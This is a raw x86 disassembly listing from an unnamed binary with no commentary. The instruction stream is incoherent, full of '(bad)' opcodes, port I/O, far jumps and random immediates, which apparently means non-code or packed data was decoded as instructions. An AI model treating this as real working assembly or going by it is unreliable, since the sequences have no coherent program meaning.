  4146f8:	call   0xa71c:0x2f448844
  4146ff:	pop    edx
  414700:	xchg   ecx,eax
  414701:	out    0x3,al
  414703:	mov    eax,ds:0x59eb25a9
  414708:	push   edi
  414709:	pop    edx
  41470a:	add    al,0x58
  41470c:	scas   al,BYTE PTR es:[edi]
  41470d:	(bad)  [eax-0xb81d65f]
  414713:	and    bh,BYTE PTR [ebx]
  414715:	push   cs
  414716:	(bad)  
  414717:	aad    0x2a
  414719:	sbb    DWORD PTR [ebx],0x96565021
  41471f:	in     al,dx
  414720:	popa   
  414721:	mov    bh,0xff
  414723:	cld    
  414724:	jmp    0x4146b0
  414726:	pushf  
  414727:	in     al,dx
  414728:	jae    0x4146cd
  41472a:	out    0x50,al
  41472c:	shl    DWORD PTR [ecx-0x4a],0x84
  414730:	retf   0xdce6
  414733:	sub    al,0xc8
  414735:	dec    ecx
  414736:	nop
  414737:	sbb    al,0x3a
  414739:	pop    ds
  41473a:	rcr    DWORD PTR [ebp+0x5b],1
  41473d:	jb     0x414722
  41473f:	mov    BYTE PTR [ebx],ah
  414741:	xchg   BYTE PTR [ebp+0x63],bh
  414744:	mov    fs,WORD PTR [edi+0x523d6980]
  41474a:	xchg   edi,eax
  41474b:	cmp    DWORD PTR [esp+ecx*8+0x4b6aa052],eax
  414752:	sahf   
  414753:	in     eax,dx
  414754:	ja     0x41474c
  414756:	pop    ss
  414757:	adc    eax,0xf0c496e2
  41475c:	test   eax,0xb0fb6856
  414761:	test   al,0x84
  414763:	jmp    0x4146f9
  414765:	je     0x414706
  414767:	cwde   
  414768:	call   0xdca7076f
  41476d:	mov    eax,ds:0x6a563a46
  414772:	inc    edx
  414773:	push   ebx
  414774:	ins    BYTE PTR es:[edi],dx
  414775:	inc    esi
  414776:	lock test al,0x64
  414779:	test   DWORD PTR ds:0x27642d7b,edx
  41477f:	cmp    al,0x21
  414781:	jbe    0x41479c
  414783:	(bad)  
  414784:	sti    
  414785:	mov    ?,WORD PTR [ebp+0x57]
  414788:	js     0x414735
  41478a:	pop    edx
  41478b:	pop    es
  41478c:	fld    DWORD PTR [edx+0x210014a6]
  414792:	jp     0x4147d0
  414794:	in     al,dx
  414795:	(bad)  
  414796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414797:	xor    al,0x72
  414799:	bound  ebp,QWORD PTR [ebx+esi*2+0x76d865a7]
  4147a0:	sbb    bh,BYTE PTR [ebp+0x67]
  4147a3:	add    al,0xb8
  4147a5:	stc    
  4147a6:	in     eax,dx
  4147a7:	xor    dl,cl
  4147a9:	fild   WORD PTR [ecx]
  4147ab:	rcr    BYTE PTR ds:0x16f62998,1
  4147b1:	jmp    0x414734
  4147b3:	arpl   WORD PTR [ebx],si
  4147b5:	push   ebx
  4147b6:	enter  0x6019,0x5c
  4147ba:	add    DWORD PTR [esi],edx
  4147bc:	(bad)  
  4147bd:	loop   0x4147bc
  4147bf:	int3   
  4147c0:	push   ss
  4147c1:	adc    al,bl
  4147c3:	jecxz  0x4147c3
  4147c5:	jo     0x4147b5
  4147c7:	enter  0x84e5,0x86
  4147cb:	jp     0x414829
  4147cd:	fnstenv [edi]
  4147cf:	into   
  4147d0:	iret   
  4147d1:	add    al,0x90
  4147d3:	jp     0x414796
  4147d5:	data16 adc BYTE PTR [ecx-0x42d90682],al
  4147dc:	(bad)
  4147df:	push   eax
  4147e0:	xchg   ecx,eax
  4147e1:	jo     0x4147f2
  4147e3:	outs   dx,DWORD PTR ds:[esi]
  4147e4:	add    al,0x3e
  4147e6:	add    al,0x61
  4147e8:	sub    ebx,DWORD PTR [esi+0x3fe863e9]
  4147ee:	jecxz  0x414814
  4147f0:	int3   
  4147f1:	loope  0x4147d2
  4147f3:	sbb    ebp,DWORD PTR [ecx-0xd9aea49]
  4147f9:	out    0xb6,al
  4147fb:	sti    
  4147fc:	ins    DWORD PTR es:[edi],dx
  4147fd:	mov    ds:0x23380466,eax
  414802:	pop    edx
  414803:	mov    esi,0x71c8b882
  414808:	push   esi
  414809:	xchg   DWORD PTR [eax],ebp
  41480b:	and    BYTE PTR [ebp+0x49fde916],0x68
  414812:	push   edi
  414813:	outs   dx,DWORD PTR ds:[esi]
  414814:	sub    al,0x8
  414816:	or     eax,0x90d17544
  41481b:	xlat   BYTE PTR ds:[ebx]
  41481c:	mov    al,0x57
  41481e:	aas    
  41481f:	mov    ch,bl
  414821:	lock jp 0x41482b
  414824:	sbb    eax,DWORD PTR [esi]
  414826:	xor    BYTE PTR [edx],dh
  414828:	mov    cl,0x75
  41482a:	(bad)  
  41482b:	jg     0x4147d8
  41482d:	add    DWORD PTR [ebp-0x4f06bec9],0xffffffe0
  414834:	icebp  
  414835:	sub    dh,BYTE PTR ds:[edx+edi*2-0x6be328f5]
  41483d:	call   0xeac2:0x15c59a48
  414844:	loope  0x4147f2
  414846:	sub    al,0xdc
  414848:	cmp    DWORD PTR [edi+0x1e],edi
  41484b:	aaa    
  41484c:	push   ds
  41484d:	nop
  41484e:	dec    esp
  41484f:	bound  esp,QWORD PTR [edi-0x75d69fa1]
  414855:	push   eax
  414856:	gs cli 
  414858:	(bad)  
  414859:	cmp    DWORD PTR [eax],edi
  41485b:	pop    esi
  41485c:	ror    dl,cl
  41485e:	adc    DWORD PTR [ebp-0x1e79e032],eax
  414864:	mov    dl,0xb4
  414866:	fs out 0x30,eax
  414869:	or     bh,bl
  41486b:	ins    DWORD PTR es:[edi],dx
  41486c:	push   edi
  41486d:	lods   al,BYTE PTR ds:[esi]
  41486e:	push   esi
  41486f:	and    edi,DWORD PTR [edx-0x3707f6f7]
  414875:	ds xchg ecx,eax
  414877:	pop    es
  414878:	out    dx,eax
  414879:	mov    eax,0xa2185675
  41487e:	ret    0x9da8
  414881:	inc    ecx
  414882:	lds    esp,FWORD PTR [edx-0x5000adc5]
  414888:	pushf  
  414889:	in     al,0xf7
  41488b:	(bad)  
  41488d:	(bad)  
  41488e:	fadd   QWORD PTR ds:0x3aa56c85
  414894:	aas    
  414895:	inc    ebx
  414896:	pop    ebx
  414897:	imul   edx,esi,0x3e
  41489a:	or     edi,DWORD PTR [ebp+0x5351f147]
  4148a0:	ror    DWORD PTR [ecx+eax*2+0x72],1
  4148a4:	ja     0x4148e3
  4148a6:	mov    DWORD PTR [eax],edi
  4148a8:	or     DWORD PTR [esi],edx
  4148aa:	adc    esp,ecx
  4148ac:	sbb    bl,dh
  4148ae:	xlat   BYTE PTR ds:[ebx]
  4148af:	out    dx,al
  4148b0:	mov    dh,0x7e
  4148b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b3:	ja     0x4148fa
  4148b5:	scas   eax,DWORD PTR es:[edi]
  4148b6:	jbe    0x414910
  4148b8:	fdiv   QWORD PTR [ebp+0x4e36d4e0]
  4148be:	int    0xa
  4148c0:	fsub   DWORD PTR [edi]
  4148c2:	or     BYTE PTR [ebx+0x68a29947],ch
  4148c8:	scas   al,BYTE PTR es:[edi]
  4148c9:	adc    DWORD PTR [ebp-0x1f4bf3db],ecx
  4148cf:	int3   
  4148d0:	mov    dl,0x1e
  4148d2:	mov    ecx,0x5929b130
  4148d7:	push   ss
  4148d8:	mov    bl,BYTE PTR [edx]
  4148da:	xor    al,0xb3
  4148dc:	inc    eax
  4148dd:	or     DWORD PTR [ebx+edx*4],esp
  4148e0:	retf   0xe456
  4148e3:	sbb    ah,BYTE PTR [edi]
  4148e5:	and    BYTE PTR [ecx+0x2ffcb5ff],dh
  4148eb:	not    ah
  4148ed:	add    eax,0xcad8bd84
  4148f2:	outs   dx,BYTE PTR ds:[esi]
  4148f3:	jg     0x414903
  4148f5:	jge    0x414913
  4148f7:	scas   al,BYTE PTR es:[edi]
  4148f8:	sar    edx,cl
  4148fa:	dec    ecx
  4148fb:	dec    edi
  4148fc:	mov    ecx,0xab34c351
  414901:	bound  esi,QWORD PTR [ebp-0x2031ea99]
  414907:	mov    ebx,0xa218d4de
  41490c:	or     eax,DWORD PTR [ebp+0x77]
  41490f:	cdq    
  414910:	jo     0x414922
  414912:	dec    edx
  414913:	mov    DWORD PTR [eax+ebp*4],edx
  414916:	popa   
  414917:	mov    edi,0xa41eed61
  41491c:	fwait
  41491d:	gs mov bl,0x2d
  414920:	fdiv   st(4),st
  414922:	jmp    0x4148e0
  414924:	xchg   esi,eax
  414925:	fdiv   QWORD PTR [eax+0x7f]
  414928:	add    al,0xa8
  41492a:	dec    esi
  41492b:	fld    TBYTE PTR [edx-0x67]
  41492e:	retf   
  41492f:	lock push edi
  414931:	call   0xa2b9c9b7
  414936:	nop
  414937:	mov    ebx,0xe6a2a7b3
  41493c:	pop    DWORD PTR [edx-0x54]
  41493f:	sub    ebx,ebp
  414941:	cdq    
  414942:	lds    esp,FWORD PTR [eax+ebx*1-0x5]
  414946:	inc    edi
  414947:	inc    eax
  414948:	lds    esi,FWORD PTR [eax+0x1b78a84b]
  41494e:	pop    esp
  41494f:	adc    al,0xc6
  414951:	push   esp
  414952:	loope  0x4148d9
  414954:	inc    edi
  414955:	dec    eax
  414956:	retf   
  414957:	jns    0x4149c7
  414959:	mov    eax,0x806598bc
  41495e:	scas   eax,DWORD PTR es:[edi]
  41495f:	clc    
  414960:	mov    eax,0x561c307
  414965:	sub    BYTE PTR [ebx-0x6b02cea7],dl
  41496b:	sub    al,0x32
  41496d:	imul   BYTE PTR [ebp+0x38]
  414970:	in     al,dx
  414971:	hlt    
  414972:	mov    dl,0x8a
  414974:	xchg   BYTE PTR [eax-0x37],ah
  414977:	push   esp
  414978:	dec    ecx
  414979:	pushf  
  41497a:	jno    0x41497e
  41497c:	ja     0x4149fd
  41497e:	jne    0x4149e6
  414980:	xchg   ecx,eax
  414981:	jmp    0xacb76236
  414986:	and    eax,0x5a12036f
  41498b:	sub    ah,0x7b
  41498e:	jmp    0xf75b113b
  414993:	fs jle 0x41497a
  414996:	xchg   esp,eax
  414997:	dec    esp
  414998:	mov    al,ds:0x893faa36
  41499d:	jbe    0x4149d3
  41499f:	pop    esi
  4149a0:	test   eax,0x40f69473
  4149a5:	icebp  
  4149a6:	cmp    eax,0x293cedea
  4149ab:	or     dl,BYTE PTR [esi]
  4149ad:	or     esi,ebp
  4149af:	sub    edx,esi
  4149b1:	mov    edx,0xbdacb908
  4149b6:	pusha  
  4149b7:	add    bh,dl
  4149b9:	ja     0x414a1a
  4149bb:	arpl   WORD PTR ds:0x5a632967,si
  4149c1:	out    0x9b,al
  4149c3:	dec    esi
  4149c4:	push   eax
  4149c5:	cmp    ebp,edi
  4149c7:	out    dx,al
  4149c8:	pop    edx
  4149c9:	xchg   ecx,eax
  4149ca:	xor    ecx,DWORD PTR [esi+0x2516ce08]
  4149d0:	xchg   ebx,eax
  4149d1:	or     eax,DWORD PTR [esi+0x6a32a59f]
  4149d7:	mov    ebp,0x8d266ca7
  4149dc:	int3   
  4149dd:	cld    
  4149de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149df:	dec    edx
  4149e0:	dec    ecx
  4149e1:	aam    0x8a
  4149e3:	fadd   QWORD PTR [eax]
  4149e5:	cmp    DWORD PTR [eax],0xffffff8a
  4149e8:	(bad)  
  4149e9:	clc    
  4149ea:	pushf  
  4149eb:	xor    bl,0x67
  4149ee:	push   eax
  4149ef:	push   edi
  4149f0:	adc    al,0xa4
  4149f2:	stc    
  4149f3:	xchg   esp,eax
  4149f4:	mov    ch,0x7b
  4149f6:	int3   
  4149f7:	jo     0x414a17
  4149f9:	push   esi
  4149fa:	push   eax
  4149fb:	ret    
  4149fc:	jno    0x414a03
  4149fe:	pop    ebp
  4149ff:	xchg   ebp,eax
  414a00:	test   al,0x29
  414a02:	mov    bh,0x23
  414a04:	ret    
  414a05:	sub    eax,0x9f592d27
  414a0a:	lods   al,BYTE PTR ds:[esi]
  414a0b:	mul    BYTE PTR ds:0x9a962a2e
  414a11:	push   edx
  414a12:	fisttp WORD PTR [ecx-0xb]
  414a15:	mov    es,esi
  414a17:	sub    al,bl
  414a19:	push   esp
  414a1a:	lea    eax,[eax]
  414a1c:	push   edx
  414a1d:	pop    esi
  414a1e:	gs push edi
  414a20:	dec    esi
  414a21:	inc    edi
  414a22:	bound  ecx,QWORD PTR [edx*8+0x6c51fde2]
  414a29:	mov    edi,0x319072b2
  414a2e:	pop    ss
  414a2f:	int    0x8f
  414a31:	push   esi
  414a32:	cmp    ebx,DWORD PTR [esi+0x6b]
  414a35:	dec    esp
  414a36:	retf   0x118
  414a39:	adc    al,0xf7
  414a3b:	lds    sp,DWORD PTR [eax]
  414a3e:	loop   0x414a3b
  414a40:	bound  edx,QWORD PTR [esi+esi*2-0x2e46a3d9]
  414a47:	leave  
  414a48:	pop    edx
  414a49:	dec    esi
  414a4a:	xor    edi,esp
  414a4c:	mov    ah,0xc5
  414a4e:	jmp    0x7251e821
  414a53:	xor    esp,DWORD PTR [edi-0x69]
  414a56:	dec    edi
  414a57:	ret    
  414a58:	jno    0x414a26
  414a5a:	mov    ch,0x12
  414a5c:	sahf   
  414a5d:	adc    al,0x5d
  414a5f:	sub    BYTE PTR [eax],0x45
  414a62:	xchg   edi,eax
  414a63:	ret    0x181a
  414a66:	push   es
  414a67:	daa    
  414a68:	mov    ecx,?
  414a6a:	loopne 0x414a3b
  414a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a6d:	stc    
  414a6e:	jno    0x414adb
  414a70:	fdecstp 
  414a72:	sahf   
  414a73:	mov    bl,0xf8
  414a75:	popa   
  414a76:	push   0xc1114a61
  414a7b:	jge    0x414af2
  414a7d:	(bad)  
  414a7f:	stc    
  414a80:	mov    fs,WORD PTR ds:[ecx+ecx*8-0x5775c90]
  414a88:	pop    ebp
  414a89:	inc    esi
  414a8a:	xor    edx,DWORD PTR [edx]
  414a8c:	jle    0x414b02
  414a8e:	les    eax,FWORD PTR [esi+0x4e83457e]
  414a94:	mov    eax,DWORD PTR [esi-0xe]
  414a97:	inc    ebp
  414a98:	pop    ebx
  414a99:	mov    cs,esi
  414a9b:	adc    al,0x54
  414a9d:	cwde   
  414a9e:	iret   
  414a9f:	sbb    DWORD PTR [ebp-0x5b7fa3ff],edx
  414aa5:	jg     0x414af9
  414aa7:	jo     0x414a35
  414aa9:	imul   ebx,DWORD PTR [eax],0xfffffff4
  414aac:	jg     0x414b25
  414aae:	xchg   BYTE PTR [ebp+0x27],bl
  414ab1:	sub    eax,0x992df0da
  414ab6:	xor    eax,0x6a6d94af
  414abb:	dec    eax
  414abc:	outs   dx,BYTE PTR ds:[esi]
  414abd:	pusha  
  414abe:	mov    al,0x8
  414ac0:	push   eax
  414ac1:	dec    edi
  414ac2:	jecxz  0x414a88
  414ac4:	cmp    BYTE PTR [edx-0x371352d0],ah
  414aca:	mov    al,0xfa
  414acc:	mov    WORD PTR [esi],cs
  414ace:	xchg   esp,eax
  414acf:	dec    edx
  414ad0:	stc    
  414ad1:	push   edi
  414ad2:	imul   ebp,DWORD PTR [eax],0x4d973a38
  414ad8:	lock inc esp
  414ada:	lock xchg DWORD PTR [esi+ecx*2-0x28],edi
  414adf:	adc    BYTE PTR [ebx],dh
  414ae1:	push   eax
  414ae2:	in     al,0x15
  414ae4:	sub    DWORD PTR [ebx+0x55],eax
  414ae7:	pop    edx
  414ae8:	sbb    BYTE PTR [edi],cl
  414aea:	sbb    eax,0xfc994904
  414aef:	dec    ebx
  414af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414af1:	sahf   
  414af2:	aas    
  414af3:	jnp    0x414a7e
  414af5:	fs sub cl,bh
  414af8:	retf   
  414af9:	jmp    0x629a:0x15707bca
  414b00:	jle    0x414ac6
  414b02:	(bad)  
  414b03:	and    dh,BYTE PTR [edi]
  414b05:	xchg   ebp,eax
  414b06:	dec    esp
  414b07:	or     DWORD PTR [ebx+ecx*2+0x72],ebx
  414b0b:	fdiv   DWORD PTR [ebx+ebp*8+0x73]
  414b0f:	imul   ecx,DWORD PTR [edx],0x45db2ae3
  414b15:	mov    ds:0xcfab2b0a,al
  414b1a:	shl    BYTE PTR [ebx],0xb9
  414b1d:	ret    0x3168
  414b20:	ror    DWORD PTR [edi+ebx*2-0x40],0xe5
  414b25:	arpl   WORD PTR [ebp+ecx*8-0x6941aa93],sp
  414b2c:	xor    eax,0x59a50413
  414b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b32:	fs xor al,0x7d
  414b35:	add    dl,ch
  414b37:	out    0x5d,al
  414b39:	xchg   ebp,eax
  414b3a:	xor    dh,BYTE PTR [ebx+0x6f1fe9c8]
  414b40:	xchg   DWORD PTR ds:0x93e4cd95,esi
  414b46:	push   edx
  414b47:	mov    eax,0xff357b4d
  414b4d:	imul   esp,DWORD PTR [esi],0x9
  414b50:	gs test eax,0x79e224ae
  414b56:	add    ch,BYTE PTR [ebx-0x21f46414]
  414b5c:	scas   al,BYTE PTR es:[edi]
  414b5d:	cmp    al,0x37
  414b5f:	push   ds
  414b60:	ficom  DWORD PTR [esi]
  414b62:	adc    eax,0x517a6f5e
  414b67:	js     0x414af4
  414b69:	popf   
  414b6a:	mov    cl,0x89
  414b6c:	fcom   DWORD PTR [esi+ecx*1-0x1493637]
  414b73:	test   ebp,0x76660780
  414b79:	fidiv  DWORD PTR [edi+0x3cad6282]
  414b7f:	and    al,0xaa
  414b81:	cmp    ah,dh
  414b83:	push   es
  414b84:	das    
  414b85:	push   ss
  414b86:	pop    edx
  414b87:	mov    esi,0xdb6c1267
  414b8c:	inc    ebx
  414b8d:	push   edx
  414b8e:	sbb    BYTE PTR [esi],ch
  414b90:	fsubr  st(5),st
  414b92:	sbb    ecx,DWORD PTR ds:0xe884a03f
  414b98:	inc    edx
  414b99:	adc    DWORD PTR [eax+0x7f2a6bca],edi
  414b9f:	call   0x9074dd92
  414ba4:	jnp    0x414b96
  414ba6:	jmp    0x414c27
  414ba8:	jmp    0x3b01100c
  414bad:	jns    0x414bc6
  414baf:	dec    edx
  414bb0:	nop
  414bb1:	pop    ebp
  414bb2:	mov    BYTE PTR [ebp+0x3b],bh
  414bb5:	mov    ds:0x8beac419,eax
  414bba:	fwait
  414bbb:	std    
  414bbc:	dec    edi
  414bbd:	mov    cl,0x5e
  414bbf:	push   ds
  414bc0:	cmp    esi,edx
  414bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc3:	inc    ebp
  414bc4:	add    ebp,esp
  414bc6:	mov    esi,0x58dbb26
  414bcb:	inc    edi
  414bcc:	aad    0xa0
  414bce:	inc    esi
  414bcf:	xchg   ebp,eax
  414bd0:	ret    0xa9a6
  414bd3:	mov    bl,0x45
  414bd5:	dec    edx
  414bd6:	fs jmp 0x5d295934
  414bdc:	cmp    ebx,eax
  414bde:	test   DWORD PTR [eax-0xc],0x45a81678
  414be5:	jns    0x414bec
  414be7:	(bad)  
  414be8:	jne    0x414c19
  414bea:	cmc    
  414beb:	jnp    0x414c5f
  414bed:	(bad)  
  414bee:	adc    DWORD PTR [ebp-0x2d9c2df4],eax
  414bf4:	scas   al,BYTE PTR es:[edi]
  414bf5:	dec    ecx
  414bf6:	enter  0x6ac3,0xd6
  414bfa:	pop    eax
  414bfb:	or     ebx,eax
  414bfd:	xor    dl,BYTE PTR [edi-0x724912a4]
  414c03:	adc    DWORD PTR [ebx+esi*4],ecx
  414c06:	ret    
  414c07:	loope  0x414c17
  414c09:	push   eax
  414c0a:	es fwait
  414c0c:	add    bh,BYTE PTR [esi+0x480851f3]
  414c12:	inc    esi
  414c13:	push   ebx
  414c14:	xchg   ah,al
  414c16:	mov    ?,WORD PTR [esp+edi*8-0xbcada4b]
  414c1d:	out    0xce,al
  414c1f:	clc    
  414c20:	iret   
  414c21:	jecxz  0x414c00
  414c23:	xchg   esp,eax
  414c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c25:	and    DWORD PTR [edi+0x10],ecx
  414c28:	cli    
  414c29:	imul   ebx,DWORD PTR ds:0xc46af195,0xe1a11da4
  414c33:	ins    DWORD PTR es:[edi],dx
  414c34:	rcl    BYTE PTR ds:0x95efa81e,1
  414c3a:	dec    edi
  414c3b:	jne    0x414c8e
  414c3d:	stos   DWORD PTR es:[edi],eax
  414c3e:	mov    WORD PTR [eax+esi*4],gs
  414c41:	push   ds
  414c42:	pop    ebp
  414c43:	mov    ecx,DWORD PTR [ecx]
  414c45:	ss pop edi
  414c47:	loopne 0x414c26
  414c49:	pop    ebp
  414c4a:	cwde   
  414c4b:	and    BYTE PTR [esi+edi*8-0x60b9bbda],dl
  414c52:	call   0x8c8987fc
  414c57:	ins    BYTE PTR es:[edi],dx
  414c58:	mov    ebp,0x30e80522
  414c5e:	jnp    0x414cba
  414c60:	mov    bh,0xab
  414c62:	inc    edi
  414c63:	mov    edx,0xb888fa53
  414c68:	xchg   edi,eax
  414c69:	ss inc ebx
  414c6b:	(bad)  
  414c6d:	add    al,0xbf
  414c6f:	mov    bl,0x8
  414c71:	cld    
  414c72:	sbb    ecx,DWORD PTR [ebp+0x482f77e0]
  414c78:	pop    esp
  414c79:	add    dh,BYTE PTR [edx+0x2bff2a7f]
  414c7f:	fdiv   st(3),st
  414c81:	dec    ecx
  414c82:	imul   edx,edx,0xffffffd8
  414c85:	int3   
  414c86:	adc    al,0x6a
  414c88:	retf   
  414c89:	idiv   DWORD PTR [ebx]
  414c8b:	fwait
  414c8c:	pop    eax
  414c8d:	sub    ecx,DWORD PTR ds:0xc5916347
  414c93:	fwait
  414c94:	iret   
  414c95:	leave  
  414c96:	lods   al,BYTE PTR ds:[esi]
  414c97:	fidiv  DWORD PTR [esi]
  414c99:	lods   eax,DWORD PTR ds:[esi]
  414c9a:	sbb    BYTE PTR [eax+0x14],al
  414c9d:	xor    dh,ah
  414c9f:	je     0x414cac
  414ca1:	pop    ebx
  414ca2:	dec    edi
  414ca3:	fiadd  DWORD PTR [ebx+0x5e3b8be]
  414ca9:	jge    0x414ca2
  414cab:	xor    ebx,DWORD PTR [ebx+0x75765e82]
  414cb1:	jnp    0x414d1e
  414cb3:	retf   0x2a31
  414cb6:	sbb    eax,0xfaf60c7f
  414cbb:	inc    esi
  414cbc:	pop    edx
  414cbd:	push   0xb0077ab2
  414cc2:	add    al,0xb3
  414cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cc5:	lods   al,BYTE PTR ds:[esi]
  414cc6:	jne    0x414cf6
  414cc8:	cli    
  414cc9:	cmp    esi,esp
  414ccb:	test   edi,eax
  414ccd:	scas   al,BYTE PTR es:[edi]
  414cce:	mov    eax,0x520734ad
  414cd3:	test   al,0xdd
  414cd5:	push   esp
  414cd6:	or     edi,DWORD PTR [ecx]
  414cd8:	sub    al,0xd6
  414cda:	pop    ecx
  414cdb:	add    al,0xd4
  414cdd:	ja     0x414cf5
  414cdf:	loope  0x414cc6
  414ce1:	imul   edx,eax,0xeedd26a8
  414ce7:	mov    dh,0x63
  414ce9:	gs js  0x414c91
  414cec:	mov    ebp,0x4f4c0164
  414cf1:	rol    BYTE PTR [esp+edi*2+0x5566f083],0xad
  414cf9:	std    
  414cfa:	push   ebp
  414cfb:	fbld   TBYTE PTR [edx+0x59]
  414cfe:	or     BYTE PTR [eax-0x2022242],0x8
  414d05:	(bad)  
  414d06:	pop    ebp
  414d07:	into   
  414d08:	lods   al,BYTE PTR ds:[esi]
  414d09:	cmp    eax,0xd24cbde5
  414d0e:	loopne 0x414ca7
  414d10:	push   0x7aac0bb1
  414d15:	in     eax,0x36
  414d17:	and    al,0xeb
  414d19:	outs   dx,BYTE PTR ds:[esi]
  414d1a:	dec    eax
  414d1b:	and    eax,0x7c26ec72
  414d20:	out    0x5c,eax
  414d22:	shr    DWORD PTR [edi],1
  414d24:	xchg   ebx,eax
  414d25:	mov    DWORD PTR [ecx+edx*8+0x6],esp
  414d29:	loope  0x414d43
  414d2b:	push   ecx
  414d2c:	push   eax
  414d2d:	or     al,0xe1
  414d2f:	cmp    esi,eax
  414d31:	out    0xc9,al
  414d33:	jo     0x414d8a
  414d35:	xor    bh,al
  414d37:	pushf  
  414d38:	xor    dl,ch
  414d3a:	push   edx
  414d3b:	xor    cl,BYTE PTR [esi+0x70]
  414d3e:	mov    dh,0x27
  414d40:	stos   DWORD PTR es:[edi],eax
  414d41:	sbb    cl,BYTE PTR [esi]
  414d43:	sub    ah,BYTE PTR [ecx-0x66180af0]
  414d49:	dec    esi
  414d4a:	add    DWORD PTR [ebp+0x72],esi
  414d4d:	dec    ecx
  414d4e:	and    eax,0x502065c3
  414d53:	addr16 test ebp,edi
  414d56:	mov    al,BYTE PTR [ecx]
  414d58:	push   ds
  414d59:	dec    DWORD PTR [eax]
  414d5b:	rcr    DWORD PTR [edi+eax*1+0x38b34439],0x89
  414d63:	dec    ebp
  414d64:	dec    ebp
  414d65:	pop    ss
  414d66:	mov    eax,DWORD PTR [esi-0x45]
  414d69:	aad    0x50
  414d6b:	retf   
  414d6c:	ins    DWORD PTR es:[edi],dx
  414d6d:	pop    esi
  414d6e:	cmp    bl,BYTE PTR [ebx+0x6c555db2]
  414d74:	jnp    0x414dc4
  414d76:	cmp    bl,ah
  414d78:	ds out dx,eax
  414d7a:	adc    edx,DWORD PTR [ebp-0x70f7e011]
  414d80:	sbb    cl,al
  414d82:	mov    eax,ds:0x72dce897
  414d87:	cmp    BYTE PTR [ecx-0x4924a00f],ch
  414d8d:	les    ecx,FWORD PTR [ebx]
  414d8f:	push   0x71
  414d91:	in     eax,dx
  414d92:	push   0x695a15cb
  414d97:	out    0xa4,eax
  414d99:	test   BYTE PTR [esi],dh
  414d9b:	iret   
  414d9c:	push   ds
  414d9d:	in     eax,dx
  414d9e:	lods   al,BYTE PTR ds:[esi]
  414d9f:	push   0x88871055
  414da4:	adc    eax,0x32a195be
  414da9:	ins    BYTE PTR es:[edi],dx
  414daa:	fcmovnu st,st(3)
  414dac:	jb     0x414d45
  414dae:	cmp    ebp,0x74
  414db1:	lods   eax,DWORD PTR ds:[esi]
  414db2:	fild   QWORD PTR [ecx-0x7d]
  414db5:	jo     0x414e0e
  414db7:	mov    ds:0xd2ffa9c0,al
  414dbc:	cmp    BYTE PTR [ebx-0x65a93bfc],dh
  414dc2:	sbb    al,0xb9
  414dc4:	scas   al,BYTE PTR es:[edi]
  414dc5:	mov    edx,0xfd2285fd
  414dca:	dec    ecx
  414dcb:	int3   
  414dcc:	(bad)  
  414dcd:	cmp    bh,BYTE PTR [eax-0xe]
  414dd0:	stc    
  414dd1:	jle    0x414dde
  414dd3:	xlat   BYTE PTR ds:[ebx]
  414dd4:	xchg   ebx,eax
  414dd5:	fbstp  TBYTE PTR ds:0xb98f50a4
  414ddb:	jns    0x414d7c
  414ddd:	arpl   WORD PTR [edi-0x3efa0d5d],si
  414de3:	inc    ecx
  414de4:	inc    eax
  414de5:	xchg   DWORD PTR [esi+esi*8-0xe41ff2c],ebp
  414dec:	pop    eax
  414ded:	mov    edx,0xc8e9f378
  414df2:	adc    BYTE PTR [ebx+0x394355c4],0xd
  414df9:	dec    ecx
  414dfa:	or     al,0x2e
  414dfc:	ds adc esi,eax
  414dff:	js     0x414e4f
  414e01:	sub    BYTE PTR [ebx-0x62],bl
  414e04:	mov    edi,0xbdf1930
  414e09:	rcpps  xmm3,XMMWORD PTR [ebx+0x762083aa]
  414e10:	pop    esi
  414e11:	(bad)  
  414e12:	(bad)  
  414e13:	mov    dl,0x14
  414e15:	lods   al,BYTE PTR ds:[esi]
  414e17:	jnp    0x414e52
  414e19:	call   0xe7e9:0xb518b695
  414e20:	push   0x69
  414e22:	add    eax,0x88f0e406
  414e27:	and    ebp,DWORD PTR [edx-0x42531ebb]
  414e2d:	nop
  414e2e:	dec    DWORD PTR [edi+0x68832ab0]
  414e34:	xchg   ecx,eax
  414e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e36:	xchg   esp,eax
  414e37:	rcl    BYTE PTR [ecx+esi*2+0x4e],1
  414e3b:	sbb    eax,0xa0938738
  414e40:	ret    
  414e41:	xchg   esp,eax
  414e42:	imul   DWORD PTR [ebx]
  414e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e45:	add    ebp,edx
  414e47:	jns    0x414e1d
  414e49:	das    
  414e4a:	and    dl,BYTE PTR [edi-0x1bbe7e4]
  414e50:	xchg   DWORD PTR [eax-0xf],edi
  414e53:	cmp    BYTE PTR [edx],bl
  414e55:	fwait
  414e56:	mov    cl,0xe0
  414e58:	sub    esp,DWORD PTR [ebx-0x564047]
  414e5e:	cmp    BYTE PTR [ebp-0x6cdb0b21],ah
  414e64:	ja     0x414e44
  414e66:	leave  
  414e67:	jmp    0x1b189a1a
  414e6c:	push   ds
  414e6d:	dec    esi
  414e6e:	fstp   DWORD PTR [ebx]
  414e70:	and    eax,0x5f65561
  414e75:	pusha  
  414e76:	xor    eax,0x3d054e
  414e7b:	(bad)
  414e7e:	fistp  WORD PTR ss:[ecx-0x42]
  414e82:	(bad)  
  414e83:	or     eax,0xb7174690
  414e88:	leave  
  414e89:	jl     0x414e8a
  414e8b:	pop    ss
  414e8c:	xor    bh,dl
  414e8e:	shl    DWORD PTR [ebx],0x73
  414e91:	add    DWORD PTR [edi+ebp*2-0x33],esi
  414e95:	imul   esp,DWORD PTR [edi+0x44],0xde7d99b3
  414e9c:	dec    eax
  414e9d:	jne    0x414eaa
  414e9f:	jle    0x414f1c
  414ea1:	jo     0x414f19
  414ea3:	loope  0x414e33
  414ea5:	popf   
  414ea6:	sub    esi,DWORD PTR [ebx+0x1e62eb2b]
  414eac:	adc    eax,0x81fbed2a
  414eb1:	rcr    bx,0x7e
  414eb5:	cmp    eax,0x38f234ee
  414eba:	push   ebx
